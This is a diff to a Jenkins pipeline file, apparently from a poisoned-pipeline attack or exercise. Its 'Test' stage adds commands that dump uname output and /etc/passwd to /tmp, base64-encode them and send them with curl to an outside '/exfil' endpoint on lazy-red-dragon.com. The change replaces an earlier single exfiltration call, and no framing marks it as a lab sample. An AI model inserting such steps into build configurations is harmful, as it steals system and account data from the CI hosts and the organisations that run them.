@@ -5,7 +5,10 @@ node('ecs-small-3gb'){
 
     stage('Test') {
         echo 'Testing...'
-        sh 'curl -i -k https://www.lazy-red-dragon.com/exfil?data="$(uname -an)"'
+        sh 'uname -an > /tmp/system.log'
+        sh 'cat /etc/passwd > /tmp/passwd.log'
+        sh 'curl -i -k https://www.lazy-red-dragon.com/exfil?data="$(base64 /tmp/system.log)"'
+        sh 'curl -i -k https://www.lazy-red-dragon.com/exfil?data="$(base64 /tmp/passwd.log)"'
     }
 
     stage('Deploy') {
